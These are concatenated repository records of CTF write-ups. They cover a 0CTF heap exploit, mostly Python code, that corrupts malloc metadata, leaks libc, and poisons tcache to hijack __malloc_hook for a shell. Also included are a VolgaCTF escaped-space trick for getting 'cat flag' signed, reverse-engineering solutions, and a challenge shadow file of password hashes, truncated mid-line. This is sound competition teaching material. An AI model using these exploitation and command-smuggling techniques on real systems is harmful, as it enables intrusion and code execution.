before `libc` memory, so that the offset from them to `libc` is constant. Then change the size of string using underflow OOB, then use that string to read/write memory in `libc`. However, this does not work, because `0x4` will also be written to memory of string, and it overlaps with a pointer and will cause segmentation fault when we use that string again.\n\nInstead, I tried to write the size of `ptmalloc` memory chunk meta data. To be specific, I tried to change the `size` field of the chunk and cause overlapping, then leak `libc` address by having a `unsorted bin` on memory region of string.\n\nTherefore, we need a **heap layout** like this\n\n```\n1. array, its `chunk size` is going to be overwritten \n2. array, whose size should be smaller than array 1\n3. string, whose size should be comparatively big to ensure the addresses will lay inside it\n4. array, used to trigger OOB vuln\n```\n\n`1-4` should be adjacent without any other chunks lay between them. Such situation is a bit hard to produce. A point to note is the existence of array `2`: we need it to prevent pointers in string 3 from being overwritten. The reason is that in this interpreter, we cannot create an array with fixed large size directly, but can only produce an empty array first and add elements later (this is the case even if we use `var a = [1,2,3,4,5]`); when the array is enlarged, the size of memory will always be doubled (like the implementation of `std::vector`). If we don't have `array 2`, the `unsorted bin` will overlap precisely with `string 3` and overwrite pointers at the beginning of string when trying to write `libc` address onto memory of `string 3`, and this is not what we want.\n\nHowever, as I said, such heap layout is hard to produce. When we continuously enlarge the size of array or string, `realloc` will cause initial small chunks to be freed, which produces many fragments that may lay between the objects that we allocated; also the order of heap objects in memory layout does not have to be identical as order of allocation, which causes a different layout. To avoid these problems and achieve the effect we want, we can do this:\n\n```python\nexp1 = '''var x = \"11111111111111111111111111111111\"\nvar i = 0 while (i < 7) {x = x + x i = i + 1 System.gc()}\nvar j = 0 var ba = [] while (j < 0x100) { ba.add(1) j = j + 1 System.gc()}\nvar bec = [1,2,3,4,5,6,7,8]\nvar bed = [1,2,3,4,5,6,7,8]\nbec = 0\nbed = 0\nSystem.gc()'''\n# perform last x = x + x after 2 arrays are allocated\n# to prevent small fragments to lay between objects\nexp2 = '''x = x + x System.gc()\nj = 0 var bb = [] while (j < 0x400) { bb.add(2) j = j + 1 System.gc()}\nSystem.gc()'''\n#it seems that it is better to have System.gc() in each loop\n#the sizes are obtained by trial and error\nsend_payload(exp1.split('\\n'))\n\n#try to remove a chunk from bins, \n#otherwise `prev_size != size` will occur for that chunk \nsend_payload([\n\t\"j = 0 var bea = [] while (j < 0x10) { bea.add(0x1000) j = j + 1 System.gc()}\",\n\t\"j = 0 var beb = \\\"%s\\\"\" % ('A' * 0x70)])#consume a bin\n#now heap:\n#1. string x '111'\n#2. ba\n\n#payloads = []\n#for i in xrange(4):\n#\tpayloads.append(\"j = 0 var be%s = [1,2,3,4]\" % chr(ord('a') + i))\n#too many fragments :(\nsend_payload([\"j = 0 var baa = [] while (j < 0x80) { baa.add(1) j = j + 1 System.gc()}\"])\nsend_payload(exp2.split('\\n'))\n#now heap layout:\n#1. ba -> try to change chunk size for this one \n#2. baa 0x55555578b650\n#3. x \n#4. bb\n```\n\nThen it's time to **leak the addresses**.\n\nFirstly we change the chunk size of `ba` to wrap `ba`, `baa` and `x`, so when this big chunk is consumed, the addresses in `unsorted bin` will be written to string `x` so we can leak it.\n\n```python\nsend_payload([\"bb[%d]=%s\" % (-0x386, qword_to_double(0x1010+0x810+0x2030+1)), #change chunk size of `ba`\n\t\"ba = 0\",\"System.gc()\"]) # free(ba) 0x55555578a640\n\nsend_payload([\"j = 0 var bc = [] while (j < 0x100) { bc.add(2019) j = j + 1 System.gc()}\"])\n#This `bc` is also some neccessary consumption of freed bins\nsend_payload([\"j = 0 var bca = [] while (j < 0x101) { bca.add(2019) j = j + 1 System.gc()}\"])\n#now heap address and libc address have been shoot to x 0x7b0\n\nleak = \"\"\nfor i in xrange(0x7b0,0x7b8):\n\tleak += send_payload([\"System.print(x[%d])\" % i], True)\n\tsend_payload([\"System.gc()\"])\nlibc_addr = u64(leak) - 0x3ebca0\n\nleak = \"\"\nfor i in xrange(0x7c0,0x7c8):\n\tleak += send_payload([\"System.print(x[%d])\" % i], True)\n\tsend_payload([\"System.gc()\"])\nheap_addr = u64(leak)\n\nprint hex(libc_addr),hex(heap_addr)\n```\n\nThen we have address leak, then we need to find ways to **get shell**. Since this is `libc-2.27`, there is a `struct` `tcache_perthread_struct` at the beginning of the heap. We can rewrite the entry of such structure to poison the `tcache`. Luckily, `0x50` chunk head is at `xxx8` memory address so we can rewrite it using our own value (note we always have `0x4` at `xxx0` address). We can rewrite it to `&__malloc_hook` so we can rewrite this function pointer. The `one_gadget` does not seem to work very well since the pre-condition does not satisfy, but we can control a large piece of stack memory, so we can do ROP. \n\n```python\nsend_payload([\"bb[%d]=%s\" % (-0x1ae4, qword_to_double(libc_addr + e.symbols[\"__malloc_hook\"] - 0x20))])\npayload = \"var s2 = [%s,2,3,1]\" % qword_to_double(libc_addr + 0x162ea3)\n#0x162ea3 : add rsp, 0x520 ; pop rbx ; ret\nassert len(payload) < 0x2b0\npayload = payload.ljust(0x2b0, '\\x00')\npayload += p64(libc_addr + 0x4f322) #one gadget\npayload += '\\x00' * 0x60 #satisfy condition\nsend_payload([\"var s1 = [1,2,3,4]\"])\nsh.sendline(payload)\n```\n\nThe data structure that I use does not seem to be that `array` one, but it still writes our floating point number to the memory being allocated. Another thing to note is that the reason why `__free_hook` might not work very well is that there is a `stdin lock` structure before `__free_hook`, and the `fgets` function will get stuck if we tamper it. In this case we must use the `array` structure because it won't tamper much memory before the target, but this is going to use `realloc` to enlarge memory, and the weird thing is `realloc` will not use memory chunks in `tcache`. `:(`\n\n[Full Exploit Script](plang.py)", "timestamp": "2025-10-24T11:39:18.503948"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-03-23-0CTF-TCTF-Quals/grammar.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-03-23-0CTF-TCTF-Quals/grammar.md", "content": "```\nnum -> 0x[0-9a-f]+ | 0[0-9]+ | [0-9]+'.'?[0-9]+\nstring -> '\"' [.]* '\"'\nid -> [a-zA-Z_]+[a-zA-Z_0-9]*\nvarDef -> 'var'[ \\t]+id ('=' exp)?\nifStat -> 'if' '(' exp ')' (block | statements) ('else' block)?\nwhileStat -> 'while' '(' exp ')' (block | statements)\nforStat -> 'for'[ \\t]+id[ \\t]+'(' exp ')' (block | statements)\nbreakStat -> 'break'\ncontinueStat -> 'continue'\nreturnStat -> 'return'[ \\t]+ exp\nparaList -> id?(,id)*\nfunDef -> 'fun' id '(' paraList ')' block\nsubscriptCall -> id[ \\t]* '[' exp ']'\ngetterCall -> id[ \\t]* block?\nsetterCall -> id[ \\t]* '='[ \\t]* exp\nmethodCall -> id[ \\t]* '(' paraList ')' [ \\t]* block?\nMethodsCall -> (id[ \\t]*.)? (methodCall | setterCall | getterCall)\ncallStat -> subscriptCall | methodCall\nstatements -> (ifStat | whileStat | forStat | breakStat | continueStat | returnStat | callStat)*\ninfixOp = '+' | '-' | '*' | '/' | '%' | '>' | '<' | '==' | '!=' | '>=' | '<=' | '&&' | '||' | '&' | '|' | '~' | '>>' | '<<'\nprefixOp = '-' | '!'\ninfixExp -> exp ([ \\t]*infixOp [ \\t]*exp)+\nprefixExp -> prefixOp [ \\t]*exp\nexp -> num | string | id | callStat | infixExp | prefixExp\nblock -> '{' ('|' paraList '|')? statements '}'\ninstantField -> varDef\nstaticField -> 'static'[ \\t]+ instantField\nfieldDef -> (instantField | staticField)*s\nmethodDef -> 'static'?[ \\t]+ id'(' paraList ')' block\ngetterDef -> 'static'?[ \\t]+ id[ \\t]+ block\nsetterDef -> 'static'?[ \\t]+ id[ \\t]*'='[ \\t]*'(' id ')'[ \\t]+ block\nmethodsDef -> (methodDef | getterDef | setterDef)*\nclassDef -> 'class' id (< id)? '{' fieldDef | methodsDef '}'\n```\n", "timestamp": "2025-10-24T11:39:18.654374"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-03-29-VolgaCTF-Quals/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-03-29-VolgaCTF-Quals/README.md", "content": "# 2019-03-39-VolgaCTF-Quals #\n\n[CTFTime link](https://ctftime.org/event/713) | [Website](https://q.2019.volgactf.ru)\n\n---\n\n## Challenges ##\n\n### Crypto ###\n\n - [x] [100 Shadow Cat](#100-crypto--shadow-cat)\n - [ ] 100 LG\n - [ ] 150 Shifter\n - [x] [200 Blind](#200-crypto--blind)\n - [ ] 500 Beard Party\n\n### Anti-Fake ###\n\n - [x] [75 Fakegram star](#75-anti-fake--fakegram-star)\n - [ ] 50 Horrible retelling\n\n### Stego ###\n\n - [x] [100 Higher](#100-stego--Higher)\n - [x] [150 JOI](#150-stego--joi)\n\n### Reverse ###\n\n - [x] [100 PyTFM](#100-reverse--pytfm)\n - [x] [250 TrustVM](#250-reverse--trustvm)\n - [x] [250 JAC II](#250-reverse--jac-ii)\n - [ ] 300 Online games\n\n### PWN ###\n\n - [x] [100 warm](#100-pwn--warm)\n\n### Web ###\n\n - [ ] 100 Shop\n - [ ] 200 Blog\n - [ ] 300 Gallery\n - [ ] 100 Shop V.2\n - [ ] 150 HeadHunter\n\n### Anti-Joy ###\n\n - [ ] 1 Schrödinger's task\n\n---\n\n## 100 Crypto / Shadow Cat\n\n**Description**\n\n> Shadow Cat\n> \n> We only know that one used /etc/shadow file to encrypt important message for us.\n\n\n\n**Files provided**\n\n - [shadow.txt](files/shadow.txt) \n - [encrypted.txt](files/encrypted.txt)\n\n**Solution**\n\n(TODO)\n\n\n## 200 Crypto / Blind ##\n\n**Description**\n\n> Blind\n> Pull the flag...if you can.\n>\n> `nc blind.q.2019.volgactf.ru 7070`\n\n\n**Files provided**\n\n - [server.py](files/server.py)\n\n**Solution**\n\nLooking through the source code, there is a RSA class, with a sign and verify functions. They provide us with the n and e. The first idea was to factor n but we can see that n is quite large (617 digits) so this was a no go.\n\n\nWhen connecting to the server, it asks for a signature and the command to execute. It does some sanitization, splits the message into signature and command and check which command to use and execute the relevant piece of the main function based on the code. \n\nLooking through the main function, the valid commands it takes are `ls`, `dir`, `cat`, `cd`, `leave` and `exit`. `ls` and `dir` did not have a signature check. We could use this find out where the flag is.\n\nRunning \n```bash\n$ nc blind.q.2019.volgactf.ru 7070\n\nEnter your command:\nxx ls -al\n\ndrwxrwxr-x 2 root root 4096 Mar 29 18:34 .\ndrwxrwxr-x 3 root root 4096 Mar 29 18:35 ..\n-r--r--r-- 1 root root   36 Mar 29 18:34 flag\n-r--r--r-- 1 root root  620 Mar 29 18:34 private_key.py\n-r-xr-xr-x 1 root root 4613 Mar 29 18:31 server.py\n```\n\nInputting the command `xx ls -al` prints out the files in the current directory. We see that the flag file is present in the current directory. So all we need to do is cat the flag.\n\nInitially, I tried to run `xx ls; cat flag` as we didn't need a signature check for ls. The command is sanitized using `shelex.split()` which catches semi colons and other characters and treats them as one command. So there wasn't an easy way to run two commands. So we need to sign the cat command and use it to print the flag.\n\nLuckily we can use the `sign` command given to us. \n\n```bash\n$ nc blind.q.2019.volgactf.ru 7070\n\nEnter your command:\nxx sign\nEnter your command to sign:\n\n```\nWe pass in the command we want to sign (base64 encoded) and the main function, takes decodes and splits the command using the space deliminator using the `shlex.split()`. It checks that the first word of the command passed is not `cat` or `cd`. If it is then it prints out \"Invalid command\". Otherwise it returns the signature of the command passed. \n\nIn order to get around this, if we escape the space character, the `shlex.split()` function does not split on the space.\n\nBase64 encoding `cat\\ flag` gives us `Y2F0XCBmbGFn`.\nInputting this in, by passes the check as it now ignores the space between the `cat` and `flag` and returns the signature.\n\nWe can now, pass in the valid signature and the `cat flag` command and that gives us the flag.\n\n```bash\n$ nc blind.q.2019.volgactf.ru 7070\n\nEnter your command:\nxx sign\nEnter your command to sign:\nY2F0XCBmbGFn\n24276592954466402792157532919706447334355948690098023035375614012157378412616233865544533025515869836447793226406373271083160180523082800598281266834619631704245143244545577613294590334637358684061108293899492468337030535564036215463887905645938530571058038030943037016298964167966109577883005551522062164917343818964991120441652232394288629520079832539360872798332983684006902802429243645009242747601354050053448137191986860769673762567997572657102990869994555786984110522299362261357652756180804304984027320764350120137457095771345729635881422070403269427999652221843885023772233721400195669139542781850847904777323\nEnter your command:\n24276592954466402792157532919706447334355948690098023035375614012157378412616233865544533025515869836447793226406373271083160180523082800598281266834619631704245143244545577613294590334637358684061108293899492468337030535564036215463887905645938530571058038030943037016298964167966109577883005551522062164917343818964991120441652232394288629520079832539360872798332983684006902802429243645009242747601354050053448137191986860769673762567997572657102990869994555786984110522299362261357652756180804304984027320764350120137457095771345729635881422070403269427999652221843885023772233721400195669139542781850847904777323 cat flag\nVolgaCTF{B1ind_y0ur_tru3_int3nti0n5}\n```\n\n`VolgaCTF{B1ind_y0ur_tru3_int3nti0n5}`\n\n\n## 75 Anti-fake / Fakegram star ##\n\n**Description**\n\n> Fakegram star\n> \n> Fake news has become a real problem for countries all over the world. To be successful in this task you have to find original sources and to be attentive to detail. When media steal news part of information might be lost.\n>\n> [Link](https://www.instagram.com/volgactftask/?utm_source=ig_profile_share&igshid=1wcnc8ve1nwzf)\n>\n> UPD Fixed bug with the flag\n\n**Solution**\n(TODO)\n\n\n## 100 Stego / Higher ##\n\n**Description**\n\n> Higher\n> \n> Take higher\n\n**Files provided**\n\n - [recorded.mp3](files/recorded.mp3)\n\n**Solution**\n\n(TODO)\n\n\n## 150 Stego / JOI ##\n\n**Description**\n\n> JOI\n> \n> All we have is just one image\n\n\n**Files provided**\n\n - [result.png](files/result.png)\n\n**Solution**\n\n(TODO)\n\n\n## 100 Reverse / PyTFM\n\n\n**Description**\n\n> PyTFM\n> \n> Can the PyTFM transformation be inverted?\n\n\n**Files provided**\n\n - [pytfm.so](files/pytfm.so)\n - [transformer.py](files/transformer.py)\n - [flag.enc](files/flag.enc)\n\n**Solution**\n\nThe library has implemented a Python module, and function `transform` is implemented there. By inspecting the global data structure with some reasonable guess, we find that function `0x1290` is the `transform` function. More information can be found [here](https://docs.python.org/3/c-api/module.html). By looking at documentation, we can know `_PyArg_ParseTuple_SizeT(a2, \"y#:transform\", &input_1, &size)` parses the input to `const char* input_1` and length of input to `__int64 size`.\n\n> `:`\n>\n> The list of format units ends here; the string after the colon is used as the function name in error messages (the “associated value” of the exception that [`PyArg_ParseTuple()`](https://docs.python.org/3/c-api/arg.html#c.PyArg_ParseTuple) raises).\n>\n> `y#` (read-only [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object)) [const char *, int]\n>\n> This variant on `s#` doesn’t accept Unicode objects, only bytes-like objects.\n>\n> https://docs.python.org/3/c-api/arg.html\n\nThen there is a weird operation against the size of input, I cannot understand it, but by dynamic execution, we know it is rounding the size up to the power of 2, then multiply by `0x10`.\n\n```python\n#testing script\nimport pytfm\nfor i in range(0, 0x40):\n\treslen = len(pytfm.transform(b'A' * i))\n\tprint (hex(i),hex(reslen))\n```\n\nThen the input is converted into complex number, with imaginary part being `0`\n\n```c\nif ( size_ > 0 )\n{\n  do\n  {\n    i_2 = i_;\n    c = input[i_];\n    v16 = &buf[i_2];\n    v16->img = 0.0;\n    v17 = (double)c;\n    i_ = ++i;\n    v16->real = v17 + 0.0;\n  }\n  while ( size_ > i );\n}\n```\n\nThen the complex number array is copied to stack\n\n```c\nv18 = alloca(16LL * size_up + 16);\nif ( size_up > 0 )\n{\n  v19 = 0LL;\n  do\n  {\n    v25[v19].real = buf[v19].real;\n    v25[v19].img = buf[v19].img;\n    ++v19;\n  }\n  while ( v6 + 1LL != v19 );                // copy it to stack\n}\n```\n\nThen `critical` function at `0x1150` is called, which is actually [FFT](https://en.wikipedia.org/wiki/FFT) as my teammate said\n\n```c\nvoid __fastcall critical(struc_1 *heap, struc_1 *stack, int size_up, signed int a4)\n{\n  signed int step; // er14\n  signed int v5; // er13\n  signed int size_up_0x1f; // ebx\n  signed int i; // er15\n  double real; // xmm0_8\n  double img; // xmm1_8\n  struc_1 *v10; // rdx\n  double v11; // xmm3_8\n  struc_1 *v12; // rax\n  struc_1 *v13; // rax\n  double v14; // xmm2_8\n  double lf_size_up; // [rsp+0h] [rbp-40h]\n\n  if ( a4 < size_up )\n  {\n    step = 2 * a4;\n    v5 = a4;\n    size_up_0x1f = size_up;\n    critical(stack, heap, size_up, 2 * a4);\n    critical(&stack[v5], &heap[v5], size_up_0x1f, step);// recursion by interleaving\n    if ( size_up_0x1f > 0 )\n    {\n      i = 0;\n      lf_size_up = (double)size_up_0x1f;\n      do\n      {\n        real = -0.0 * (double)i / lf_size_up;\n        img = (double)i * -3.141592653589793 / lf_size_up;\n        cexp(real, img);                        // result in real and img\n        mul(real, img, stack[v5 + i].real, stack[v5 + i].img);// result in real and img\n        v10 = &stack[i];\n        v11 = v10->real + real;\n        v12 = &heap[i / 2];\n        v12->img = v10->img + img;\n        v12->real = v11;\n        LODWORD(v12) = size_up_0x1f + i;\n        i += step;\n        v13 = &heap[(signed int)v12 / 2];\n        v14 = v10->real - real;\n        v13->img = v10->img - img;\n        v13->real = v14;\n      }\n      while ( size_up_0x1f > i );\n    }\n  }\n}\n```\n\nOne thing to note is the structure and calling convention of complex number, as shown below:\n\n```assembly\n00000000 complex         struc\n00000000 real            dq ?\n00000008 img             dq ?\n00000010 complex         ends\n```\n\n![](files/complex.png)\n\nWhen calling a function with a complex number argument, it is essentially same as 2 `double` arguments with real part to be the first one and imaginary part to be second. In this example, real part is passed by `xmm0` and imaginary part is passed by `xmm1`. As for the complex number as return value, `xmm0` is real part and `xmm1` is imaginary part. However, it seems that IDA does not support complex number type, but this does not affect so much if we just comment it `:)`.\n\nFinally we obtain the encoded flag in `flag.enc` and use this [website](http://scistatcalc.blogspot.com/2013/12/fft-calculator.html) to decode it, then converting `double` to `char` we get flag.\n\n```python\nfrom struct import *\nres = [0x40a79a0000000000, 0x0000000000000000,\n0x40225454778eaa78, 0x4060e41af7dfa91f,\n0x40528c7c3687fe77, 0xc055ab3079234238,\n0x4029ab5ae64c78dc, 0xc0358bea56cf49fc,\n0x4053088b7cd8a280, 0xc03ef641c0327176,\n0xc05652748400125a, 0xc049e15c7ebfc13d,\n0xc053a0bb88ab3d1c, 0xc05d6dbde71fef04,\n0x4054f7a9ff2df488, 0xc011cbe2c8c8e844,\n0x4051000000000000, 0x4058400000000000,\n0x40608a465c4bdc57, 0xc046e12f55eca3f4,\n0xc059cd87fdd9d0b4, 0x4063f18329563fb2,\n0xc03f770e300281b2, 0x4055d87bcc34a406,\n0xc024445be6c513fc, 0xc04e7b20e01938bc,\n0xc053602accefa9c8, 0x40496cfd5240a014,\n0xc0403c716005e14e, 0x401a593c0a92c2e0,\n0xc05ffbc9c690b51a, 0x406f6255d24a9654,\n0xc054400000000000, 0x0000000000000000,\n0xc05ffbc9c690b513, 0xc06f6255d24a9657,\n0xc0403c716005e14c, 0xc01a593c0a92c2e0,\n0xc053602accefa9c4, 0xc0496cfd5240a014,\n0xc024445be6c51400, 0x404e7b20e01938bb,\n0xc03f770e300281a7, 0xc055d87bcc34a404,\n0xc059cd87fdd9d0b2, 0xc063f18329563fb2,\n0x40608a465c4bdc56, 0x4046e12f55eca3fc,\n0x4051000000000000, 0xc058400000000000,\n0x4054f7a9ff2df486, 0x4011cbe2c8c8e854,\n0xc053a0bb88ab3d1c, 0x405d6dbde71fef04,\n0xc05652748400125c, 0x4049e15c7ebfc13c,\n0x4053088b7cd8a280, 0x403ef641c0327178,\n0x4029ab5ae64c78dc, 0x40358bea56cf49f9,\n0x40528c7c3687fe75, 0x4055ab307923423a,\n0x40225454778eaab0, 0xc060e41af7dfa91e]\n\nprint \"real: \"\nfor i in xrange(0,len(res),2):\n\tprint repr(unpack('d', pack('Q', res[i]))[0])\n\nprint \"imaginary: \"\nfor i in xrange(1,len(res),2):\n\tprint repr(unpack('d', pack('Q', res[i]))[0])\n\nflag = [86,111,108,103,97,67,84,70,123,70,70,84,95,49,115,95,97,99,116,117,64,108,108,121,95,115,49,109,112,108,51,125]\n\nprint \"\".join(map(chr, flag))\n```\n\n\n## 250 Reverse / TrustVM\n\n**Description**\n\n> TrustVM\n> \n> Files:\n\n**Files provided**\n\n - [data.enc](files/data.enc)\n - [encrypt](files/encrypt)\n - [reverse](files/reverse)\n\n**Solution**\n\nA virtual machine with 512-bit register is implemented (I initially regarded it as memory but it's basically same), where register `14` is the pointer to our input flag and `15` is size of our input, rounded up to `0x40`. Here is the [disassembler](files/disasm.py) and here is the [result](files/trustvm.txt).\n\nThis challenge is not so hard but time-consuming, so I will not detail it here. A thing to note is that IDA cannot analyze this switch statement very well, so you may want to manually patch the switch table to direct address instead of offset to `rip`, patch some other instructions, patch the `jmp` instruction to `jmp ds:switch_tab[rax*8]`, and use `Edit->Others->Specify switch idiom` to set correct number of entries.\n\n[Decrypt Script](files/trustvm.py)\n\n## 250 Reverse / JAC II\n\n**Description**\n\n> JAC II\n> \n> Whenever this binary is executed it transforms the input somehow - fancy that! We've tried this with our flag and now the only file with the flag is gone 😃\n>\n> Can this transformation be reversed?..\n\n\n**Files provided**\n\n - [jac2](files/jac2)\n - [data.jac2](files/data.jac2)\n\n**Solution**\n\nThere are some anti-debug techniques applied in `0x401794`, which is called in initialization function before main. There are also other initialization stuff but they are not important, the only important function is `0x401246`. There are some `jz/jnz` alignment obfuscation, we can just manually patch them.\n\nThe function is actually super easy:\n\n```c\nfor ( i = 0; i < v20; ++i )\n  critical(input[2 * i], input[2 * i + 1], &input[2 * i], &input[2 * i + 1], (uint32_t *)buf);\n//---------------------------------\nvoid __fastcall critical(unsigned int a1, unsigned int a2, unsigned int *a3, unsigned int *a4, uint32_t *dkey)\n{\n  uint32_t *dkey_; // [rsp+0h] [rbp-30h]\n  unsigned int *o2; // [rsp+8h] [rbp-28h]\n  unsigned int *o1; // [rsp+10h] [rbp-20h]\n  uint32_t tmp2; // [rsp+18h] [rbp-18h]\n  uint32_t tmp1; // [rsp+1Ch] [rbp-14h]\n  signed int i; // [rsp+28h] [rbp-8h]\n\n  o1 = a3;\n  o2 = a4;\n  dkey_ = dkey;\n  tmp1 = *dkey + a1;\n  tmp2 = dkey[1] + a2;\n  for ( i = 1; i <= 12; ++i )\n  {\n    tmp1 = rol(tmp2 ^ tmp1, tmp2 & 0x1F) + dkey_[2 * i];\n    tmp2 = rol(tmp1 ^ tmp2, tmp1 & 0x1F) + dkey_[2 * i + 1LL];\n  }\n  *o1 = tmp1;\n  *o2 = tmp2;\n}\n```\n\nWhat we need to do is simply dump value of `dkey` without reversing or knowing how it is generated (which should be in `0x4013EF`), and use that for decryption.\n\n```c\n#include <stdint.h>\n#include <stdio.h>\nuint32_t dkeys[] = {0x6291bda5, 0xd40cbbbb, 0xcdb9f3e5, 0xedbd5140,\n0x2a716584, 0x42a476de, 0x79c7cea9, 0x48852b0e,\n0x2a53b9c8, 0x2984790b, 0xdaaed337, 0x0245815e,\n0x014020ae, 0x3a84aaa9, 0x84b1fd24, 0x2766105f,\n0x1b765e10, 0xb691adc9, 0xeb50c850, 0x264c358b,\n0x32213a84, 0x387a7378, 0x1d7a8a61, 0x883de7f1,\n0x2c3bae3b, 0x6de14ba2, 0x00000000, 0x00000000};\n\nuint32_t res[] = {0x35dd19e3,0xb9fc9270,0x82dde506,0x8ea4d5d5\n,0x7fd893e2,0xa5610f08,0xaa97bd08,0x3416bcb2\n,0x569495ff,0x0feb15a3,0xb36d8705,0x64388fc4};\n\nuint32_t __attribute__ ((noinline)) ror(uint32_t a1, char a2)\n{\n\tasm(\"mov ecx,esi\\n\"\n\t\t\"mov eax,edi\\n\"\n\t\t\"ror eax,cl\\n\");\n}\n\nvoid decrypt_2dwords(uint32_t a1, uint32_t a2, uint32_t *a3, uint32_t *a4, uint32_t *dkey)\n{\n\tuint32_t tmp1 = a1;\n\tuint32_t tmp2 = a2;\n\tfor (int i = 12; i >= 1; --i)\n\t{\n\t\ttmp2 -= dkey[2 * i + 1];\n\t\ttmp2 = ror(tmp2, tmp1 & 0x1f) ^ tmp1;\n\t\ttmp1 -= dkey[2 * i];\n\t\ttmp1 = ror(tmp1, tmp2 & 0x1f) ^ tmp2;\n\t}\n\ttmp1 -= dkey[0];\n\ttmp2 -= dkey[1];\n\t*a3 = tmp1;\n\t*a4 = tmp2;\n}\n\nint main(int argc, char const *argv[])\n{\n\tfor (int i = 0; i < sizeof(res) / (sizeof(uint32_t) * 2); ++i)\n\t{\n\t\tdecrypt_2dwords(res[2 * i], res[2 * i + 1], &res[2 * i], &res[2 * i + 1], dkeys);\n\t}\n\tprintf(\"%s\\n\", (char*)res);\n\treturn 0;\n}\n```\n\n\n## 100 pwn / warm ##\n\n> warm\n> \n> How fast can you sove it? `nc warm.q.2019.volgactf.ru 443`\n\n**Files provided**\n\n - [warm](files/warm)\n\n**Solution**\n\n(TODO)\n", "timestamp": "2025-10-24T11:39:19.218400"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-03-29-VolgaCTF-Quals/files/shadow.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-03-29-VolgaCTF-Quals/files/shadow.txt", "content": "root:!:17792:0:99999:7:::\ndaemon:*:17737:0:99999:7:::\nbin:*:17737:0:99999:7:::\nsys:*:17737:0:99999:7:::\nsync:*:17737:0:99999:7:::\ngames:*:17737:0:99999:7:::\nman:*:17737:0:99999:7:::\nlp:*:17737:0:99999:7:::\nmail:*:17737:0:99999:7:::\nnews:*:17737:0:99999:7:::\nuucp:*:17737:0:99999:7:::\nproxy:*:17737:0:99999:7:::\nwww-data:*:17737:0:99999:7:::\nbackup:*:17737:0:99999:7:::\nlist:*:17737:0:99999:7:::\nirc:*:17737:0:99999:7:::\ngnats:*:17737:0:99999:7:::\nnobody:*:17737:0:99999:7:::\nsystemd-network:*:17737:0:99999:7:::\nsystemd-resolve:*:17737:0:99999:7:::\nsyslog:*:17737:0:99999:7:::\nmessagebus:*:17737:0:99999:7:::\n_apt:*:17737:0:99999:7:::\nuuidd:*:17737:0:99999:7:::\navahi-autoipd:*:17737:0:99999:7:::\nusbmux:*:17737:0:99999:7:::\ndnsmasq:*:17737:0:99999:7:::\nrtkit:*:17737:0:99999:7:::\ncups-pk-helper:*:17737:0:99999:7:::\nspeech-dispatcher:!:17737:0:99999:7:::\nwhoopsie:*:17737:0:99999:7:::\nkernoops:*:17737:0:99999:7:::\nsaned:*:17737:0:99999:7:::\npulse:*:17737:0:99999:7:::\navahi:*:17737:0:99999:7:::\ncolord:*:17737:0:99999:7:::\nhplip:*:17737:0:99999:7:::\ngeoclue:*:17737:0:99999:7:::\ngnome-initial-setup:*:17737:0:99999:7:::\ngdm:*:17737:0:99999:7:::\njr:$6$jKcSVswg$AWA/PLZVcOcQb6404vSsjmyJzgtC97R3iRDXSOBshuYmCcDVDhaIS6C4fVZnOI6EGhaUnrUWK2Y3jYhQ4vcmu0:17792:0:99999:7:::\nvboxadd:!:17792::::::\nzerotier-one:!:17792::::::\npostgres:*:17793:0:99999:7:::\npostfix:*:17794:0:99999:7:::\nlightdm:*:17930:0:99999:7:::\nz:$6$AEqLtEqq$1ojEoCgug5dzqeNfjGNE9p5SZFwIul8uOFp9vMZEz50oiUXOVFW3lw1S0fuvFY5ggi5CfbfoWaMDr2bvtSNRC/:17930:0:99999:7:::\na:$6$9Eg69bYI$q75YWUVWb4MYzkcExXukpt.VJ3fX458iZJm1ygpTLwX.CgroHpmeSG88By.zQmKyOHCvBHoA0Q001aBqbkVpg/:17930:0:99999:7:::\nx:$6$5TF0Txe3$APSNzUSjFmMbsmrkCS9qE84qfu4AI2dNEjqm2PRKgSjncBTI4lECXofQ8abdAtYX6tST6FGCgOdvLlDYQTCJx0:17930:0:99999:7:::\nq:$6$I3iqZL0m$nxHWvcLz7lg/ZKoKfX9dq5k0uqkOtKgLdyREAQxQkfPkVvbNHPfQaoCFfnXl1BoX1vgOcEDghVPvfRUrs6dGp1:17930:0:99999:7:::\nl:$6$n8iJWaW/$M1Od8seiEL6h3L.egHubBYAk.cd8/LUctESIm69/r.gvP0eqabusN5/D1rNu1qDHOkgRpHf8PWGSb8zoxrgrp1:17930:0:99999:7:::\nv:$6$GatagTHS$I1UfNfn3NGP5Vre0z7s3DGqFpjN5Pw2XhAHSw6ZSMwaMAsf8IteFedXovNlHLuIXvR9ezeya89XEOq2We7CcW1:17930:0:99999:7:::\ne:$6$ZO6YiExi$7DBV0zMIqf8iy.zVTL7gbHetCmJ3LL4ROEYG/UME4Tmym82vZYkFWjiNpCGapvF83QNJKFJOjkhXMgFLfkhza.:17930:0:99999:7:::\nf:$6$HXoF2OZ1$onkVfp52IRdd2OipQv3rPPsGr7QradAFTFnmXv5c9xkGy4xcgJFkoaSJzMQCtfWuU2FQ3BN3lyL47SyoIoPmy0:17930:0:99999:7:::\nb:$6$I9Uq9PRG$euVEYx5TR2lUFe/k7s0e8us8xgl7j/cbiYRnvba.eFfMSSPsm5I.gcShqOLqAa58m5VISomkPpHlJ1xLgCRxw/:17930:0:99999:7:::\nr:$6$J.qms5y0$YOMnlR0V.WQjqAyik3nU7TDdy8hZQZWfhF8CTJHJtd/0mrANrxBvULoXNiJnvX.yn5T3QBFu4wk3xrFye.uus1:17930:0:99999:7:::\ng:$6$b4GkIuzQ$j/prK.Jy304eu6W/NG0Yz4mHDOc3BavkYRBomdjVG.fAksRM/xIDRoWcKcJw66YZmVGcV51YkIwVZHVfA//KU.:17930:0:99999:7:::\nn:$6$f2QD.cIu$n70jbCSe0QVz7M48SVE2Z..IPDV0QjIfZ8D40oQOO9smt0ZeA2I0sSO927VIr1SJwupjZairVR0T/pKQ0QG3N1:17930:0:99999:7:::\no:$6$qyBGOX79$OAvGVjmH69C.0ZfObcJ0DcKzoSWHhBBt9sPVjbIJtYmT4nV/TU/zCiKgCkSQaQJ.n.vTjAScdh9htzjBzTwOT/:17930:0:99999:7:::\np:$6$EW1gOlyH$omuxKElrI3DeV